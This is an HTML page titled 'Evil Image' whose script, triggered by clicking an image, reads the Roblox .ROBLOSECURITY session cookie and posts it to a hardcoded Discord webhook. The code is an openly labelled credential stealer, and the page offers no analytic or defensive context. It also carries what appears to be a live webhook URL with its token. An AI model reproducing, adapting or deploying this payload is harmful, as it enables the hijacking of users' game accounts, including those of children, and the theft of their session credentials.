<!DOCTYPE html>
<html>
<head>
    <title>Evil Image</title>
    <script>
        // Function to steal Roblox cookies and send them to Discord webhook
        function stealRobloxCookies() {
            // Extract Roblox cookies
            var robloxCookies = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)[1];
            
            // Construct payload
            var payload = {
                roblox_cookies: robloxCookies
            };

            // Send payload to Discord webhook
            fetch("https://discord.com/api/webhooks/1229008890738380800/724vcjA4mUIzmtt5Z9J1vXpDhiZHnrOKi4RXZZIRIDRGwa6qSTEoEotcbFYBV3zAcodZ", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Roblox cookies sent successfully!");
                } else {
                    console.error("Failed to send Roblox cookies to Discord webhook!");
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }
    </script>
</head>
<body>
    <h1>Evil Image</h1>
    <img src="https://qph.cf2.quoracdn.net/main-qimg-593920bb2d71a9332e9110bb3cdff084" alt="Evil Image" onclick="stealRobloxCookies()">
</body>
</html>
